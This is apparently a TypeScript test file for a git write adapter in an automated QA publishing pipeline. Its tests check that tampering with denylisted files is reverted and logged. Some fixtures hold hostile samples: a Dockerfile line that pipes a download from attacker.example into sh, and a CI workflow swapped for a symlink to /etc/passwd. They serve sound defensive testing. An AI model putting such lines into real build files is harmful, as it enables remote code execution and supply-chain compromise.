// test/contexts/workspace-and-publication/infrastructure/vcs-write.adapter.test.ts
import { test } from "node:test";
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { mkdtempSync, mkdirSync, rmSync, writeFileSync, readFileSync, unlinkSync, symlinkSync, renameSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { VcsWriteAdapter } from "@contexts/workspace-and-publication/infrastructure/vcs-write.adapter.ts";
import { WriteConfinementService } from "@contexts/workspace-and-publication/domain/write-confinement.service.ts";

test("commit stages the files and commits with the message", async () => {
  const calls: string[][] = [];
  const adapter = new VcsWriteAdapter(async (args) => { calls.push(args); return ""; });
  await adapter.commit("/m", "test(e2e): qa", ["e2e/a.spec.ts"]);
  assert.deepEqual(calls[0], ["add", "--", "e2e/a.spec.ts"]);
  assert.ok(calls[1]?.includes("commit"));
  assert.ok(calls[1]?.includes("test(e2e): qa"));
});

test("push force-with-leases the branch to origin", async () => {
  const calls: string[][] = [];
  const adapter = new VcsWriteAdapter(async (args) => { calls.push(args); return ""; });
  await adapter.push("/m", "qa/e2e-abc");
  assert.ok(calls[0]?.includes("push"));
  assert.ok(calls[0]?.includes("--force-with-lease"));
  assert.ok(calls[0]?.includes("qa/e2e-abc"));
});

// PROD-BLOCKER fix: the rewritten publish path never staged/committed/pushed the agent's generated
// tests before calling GitHub's PR API (VcsWriteAdapter was never instantiated in composition-root
// — grep-confirmed zero references outside this test file). Widening this adapter with the
// remaining legacy git-mechanics primitives (src/integrations/publish.ts's publishChanges: checkout
// -B, status-check/skip-if-no-changes, and the local-exclude write) so it becomes the complete git
// side of publish — reused by the PublicationPortAdapter "pr" route (publication-port.adapter.ts)
// via a duck-typed collaborator interface, never a direct import (arch-lint confinement).

test("checkoutBranch creates/resets the branch with checkout -B", async () => {
  const calls: string[][] = [];
  const adapter = new VcsWriteAdapter(async (args) => { calls.push(args); return ""; });
  await adapter.checkoutBranch("/m", "qa/e2e-abc1234");
  assert.deepEqual(calls[0], ["checkout", "-B", "qa/e2e-abc1234"]);
});

test("hasChanges returns true when git status --porcelain reports changes under the given pathspecs", async () => {
  const adapter = new VcsWriteAdapter(async () => "M e2e/login.spec.ts\n");
  const changed = await adapter.hasChanges("/m", ["e2e"]);
  assert.equal(changed, true);
});

test("hasChanges returns false when git status --porcelain is empty for the given pathspecs (skip-if-no-changes)", async () => {
  const adapter = new VcsWriteAdapter(async () => "");
  const changed = await adapter.hasChanges("/m", ["e2e"]);
  assert.equal(changed, false);
});

test("hasChanges scopes the status check to the exact pathspecs (never the whole repo)", async () => {
  const calls: string[][] = [];
  const adapter = new VcsWriteAdapter(async (args) => { calls.push(args); return ""; });
  await adapter.hasChanges("/m", ["e2e"]);
  assert.deepEqual(calls[0], ["status", "--porcelain", "--", "e2e"]);
});

test("writeExcludes writes gitignore-style patterns to .git/info/exclude (local, never committed)", async () => {
  const writes: { dir: string; patterns: readonly string[] }[] = [];
  const adapter = new VcsWriteAdapter(
    async () => "",
    (dir, patterns) => { writes.push({ dir, patterns }); },
  );
  await adapter.writeExcludes("/m", ["node_modules/", ".qa/coverage/"]);
  assert.deepEqual(writes[0], { dir: "/m", patterns: ["node_modules/", ".qa/coverage/"] });
});

// ── FIX 1 (sdd/security-hardening, judgment-day round 2, CRITICAL) — real git fixture, commit()'s
// OWN tracked-file guard, in isolation ──────────────────────────────────────────────────────────
//
// These fixtures deliberately do NOT go through buildVcsPublish/CODE_PUBLISH_EXCLUDES (see
// rewritten-engine-factory.publish-excludes.test.ts's own note on why a "rename INTO a denylisted
// destination" fixture at that composition level would be shadowed by that file's OWN, separate
// exclude-file defense for a brand-new path) — this file pins commit()'s diff-parsing correctness
// directly: a denylisted staged path must be reverted regardless of its git status (M/D/T/R/C),
// never re-enumerated by status code.
function initRepo(): string {
  const repo = mkdtempSync(join(tmpdir(), "qa-vcswrite-"));
  const env = { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t.com", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t.com" };
  const git = (...args: string[]): string => execFileSync("git", args, { cwd: repo, encoding: "utf8", env, stdio: ["ignore", "pipe", "pipe"] }).trim();
  git("init", "-q");
  git("config", "user.email", "t@t.com");
  git("config", "user.name", "t");
  return repo;
}

function realGitFn(repo: string): (args: string[], cwd?: string) => Promise<string> {
  return async (args, cwd = repo) => {
    try {
      return execFileSync("git", args, { cwd, encoding: "utf8", stdio: ["ignore", "pipe", "pipe"] }).toString();
    } catch (e) {
      const err = e as { stdout?: string; stderr?: string };
      throw new Error(`git ${args.join(" ")} failed: ${err.stderr ?? err.stdout ?? String(e)}`);
    }
  };
}

const classifier = new WriteConfinementService();
const denyModifiedTracked = (path: string): boolean => classifier.isCodeDenied(path);

test("real git fixture: a DELETED tracked denylisted file (D status) is reverted, not committed as a deletion", async () => {
  const originalDockerfile = "FROM node:24\n";
  const repo = initRepo();
  try {
    writeFileSync(join(repo, "Dockerfile"), originalDockerfile);
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    unlinkSync(join(repo, "Dockerfile"));
    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n"); // legitimate control

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    assert.equal(readFileSync(join(repo, "Dockerfile"), "utf8"), originalDockerfile, "Dockerfile must be restored, not committed as deleted");
    const tracked = execFileSync("git", ["ls-tree", "-r", "--name-only", "HEAD"], { cwd: repo, encoding: "utf8" }).split("\n");
    assert.ok(tracked.includes("Dockerfile"), "Dockerfile must still be tracked at HEAD");
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("real git fixture: a tracked denylisted file TYPECHANGED into a symlink (T status) is reverted, not committed", async () => {
  const originalWorkflow = "name: ci\n";
  const repo = initRepo();
  try {
    mkdirSync(join(repo, ".github", "workflows"), { recursive: true });
    writeFileSync(join(repo, ".github", "workflows", "ci.yml"), originalWorkflow);
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    unlinkSync(join(repo, ".github", "workflows", "ci.yml"));
    symlinkSync("/etc/passwd", join(repo, ".github", "workflows", "ci.yml"));
    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n"); // legitimate control

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    assert.equal(
      readFileSync(join(repo, ".github", "workflows", "ci.yml"), "utf8"),
      originalWorkflow,
      "the workflow file must be restored to its tracked content, not committed as a symlink",
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

test("real git fixture: a legitimate file RENAMED into a denylisted destination (R status) reverts BOTH sides as a unit", async () => {
  const originalContent = "export const legit = 1;\n";
  const repo = initRepo();
  try {
    writeFileSync(join(repo, "legit.ts"), originalContent);
    writeFileSync(join(repo, "README.md"), "base\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    // No exclude-file layer here (unlike buildVcsPublish's CODE_PUBLISH_EXCLUDES) — "Dockerfile" is
    // a genuinely NEW, non-ignored path, so git's own content-similarity detection pairs it as a
    // rename ("R") once staged, exercising commit()'s R/C branch directly.
    renameSync(join(repo, "legit.ts"), join(repo, "Dockerfile"));
    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); // legitimate control (survives the revert)

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    const tracked = execFileSync("git", ["ls-tree", "-r", "--name-only", "HEAD"], { cwd: repo, encoding: "utf8" }).split("\n");
    assert.ok(!tracked.includes("Dockerfile"), "the rename destination must never be committed");
    assert.equal(
      readFileSync(join(repo, "legit.ts"), "utf8"),
      originalContent,
      "the legitimate origin must be restored intact, not left as an orphaned staged deletion",
    );
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});

// ── FIX 3 (sdd/security-hardening, judgment-day round 2, HIGH, both judges) — the revert must
// never be silent: a supply-chain tamper reverted underneath a run must leave a trace (logged
// loudly) and be surfaced to the caller (returned) so it can be threaded into gateSignals.
// confinement — a run must never reach verdict:pass/auto-merge with a silently-reverted tamper.

test("commit() logs loudly AND returns the reverted denylisted paths when a tamper is detected (never silent)", async () => {
  const repo = initRepo();
  const originalConsoleError = console.error;
  const errorLogs: unknown[][] = [];
  console.error = (...args: unknown[]) => { errorLogs.push(args); };
  try {
    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\n");
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    writeFileSync(join(repo, "Dockerfile"), "FROM node:24\nRUN curl https://attacker.example/x | sh\n");
    writeFileSync(join(repo, "orders.test.ts"), "test('x', () => {});\n"); // legitimate control (survives the revert)

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    const result = await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    assert.deepEqual(result.revertedDenylisted, ["Dockerfile"], "the reverted denylisted paths must be returned to the caller, not swallowed");
    assert.ok(
      errorLogs.some((args) => args.some((a) => typeof a === "string" && a.includes("Dockerfile"))),
      `a reverted tamper must be logged loudly (console.error) — logs: ${JSON.stringify(errorLogs)}`,
    );
  } finally {
    console.error = originalConsoleError;
    rmSync(repo, { recursive: true, force: true });
  }
});

test("commit() returns an empty revertedDenylisted array (never logs) when nothing was denylisted", async () => {
  const repo = initRepo();
  const originalConsoleError = console.error;
  const errorLogs: unknown[][] = [];
  console.error = (...args: unknown[]) => { errorLogs.push(args); };
  try {
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n");

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    const result = await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    assert.deepEqual(result.revertedDenylisted, []);
    assert.equal(errorLogs.length, 0, "a clean commit must never log a tamper warning");
  } finally {
    console.error = originalConsoleError;
    rmSync(repo, { recursive: true, force: true });
  }
});

test("real git fixture: a legitimate tracked-modified (M status) file survives — the guard never over-reverts a non-denylisted path", async () => {
  const repo = initRepo();
  try {
    writeFileSync(join(repo, "legit.ts"), "export const x = 1;\n");
    execFileSync("git", ["add", "-A"], { cwd: repo });
    execFileSync("git", ["commit", "-qm", "base"], { cwd: repo });

    writeFileSync(join(repo, "legit.ts"), "export const x = 2;\n");

    const adapter = new VcsWriteAdapter(realGitFn(repo));
    await adapter.commit(repo, "test(code): automated QA", ["."], denyModifiedTracked);

    assert.equal(readFileSync(join(repo, "legit.ts"), "utf8"), "export const x = 2;\n", "a non-denylisted modification must survive untouched");
  } finally {
    rmSync(repo, { recursive: true, force: true });
  }
});
